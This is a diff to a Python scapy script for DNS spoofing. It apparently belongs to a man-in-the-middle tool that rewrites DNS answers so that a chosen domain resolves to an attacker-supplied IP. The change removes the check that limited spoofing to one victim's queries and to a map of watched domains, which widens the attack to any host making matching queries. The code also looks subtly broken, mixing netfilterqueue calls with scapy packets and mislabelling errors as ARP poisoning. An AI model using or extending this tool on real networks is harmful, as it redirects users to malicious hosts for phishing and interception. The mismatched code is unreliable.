@@ -2,7 +2,7 @@ import scapy.all as sc;
 import time;
 import ipaddress;
 
-def dns_spoofing(victim_ip, watched_domains):
+def dns_spoofing(domain, spoof_ip):
     iface = ""
 
     try:
@@ -15,22 +15,18 @@ def dns_spoofing(victim_ip, watched_domains):
                 p.haslayer(sc.IP)
                 and p.haslayer(sc.UDP)
                 and p[sc.UDP].dport == 53
-                and p[sc.IP].src == victim_ip
         ))[0]
 
-        handle_dns_query(pkt, victim_ip, watched_domains)
+        handle_dns_query(pkt, domain, spoof_ip)
 
     except Exception as e:
         print(f"[!] Error during ARP poisoning: {e}")
         return None, None
     
 
-def modify_packet(packet, watched_domains):
+def modify_packet(packet, spoof_ip):
     qname = packet[sc.DNSQR].qname
-    if qname not in watched_domains:
-        print("Invalid DNS Host:", qname)
-        return packet
-    packet[sc.DNS].an = sc.DNSRR(rrname=qname, rdata=watched_domains[qname])
+    packet[sc.DNS].an = sc.DNSRR(rrname=qname, rdata=spoof_ip)
     packet[sc.DNS].ancount = 1
 
     del packet[sc.IP].len
@@ -40,7 +36,7 @@ def modify_packet(packet, watched_domains):
 
     return packet
 
-def handle_dns_query(pkt, victim_ip, watched_domains):
+def handle_dns_query(pkt, domain, spoof_ip):
     # Ensure it's a DNS packet
     if pkt.haslayer(sc.DNS) and pkt.haslayer(sc.DNSQR):
 
@@ -50,22 +46,14 @@ def handle_dns_query(pkt, victim_ip, watched_domains):
         tx_id = pkt[sc.DNS].id
         src_ip = pkt[sc.IP].src
 
-        # Only process victim's packets
-        if src_ip != victim_ip:
-            return
-
         print("\n=== DNS Query Detected ===")
         print(f"Victim IP:        {src_ip}")
         print(f"Requested Domain: {query_domain}")
         print(f"Query Type:       {query_type}")
         print(f"Transaction ID:   {tx_id}")
 
-        for domain in watched_domains:
-            if domain.encode() in query_domain.lower().encode():
-                print(f"[!] Domain MATCH: Victim requested {query_domain}")
-                modified_packet = modify_packet(pkt, watched_domains)
-                pkt.set_payload(bytes(modified_packet))
-                pkt.accept()
-                return
-            else:
-                print(f"[ ] No match for watched domain: {domain}")
+        if domain.encode() in query_domain.lower().encode():
+            print(f"[!] Domain MATCH: Victim requested {query_domain}")
+            modified_packet = modify_packet(pkt, spoof_ip)
+            pkt.set_payload(bytes(modified_packet))
+            pkt.accept()
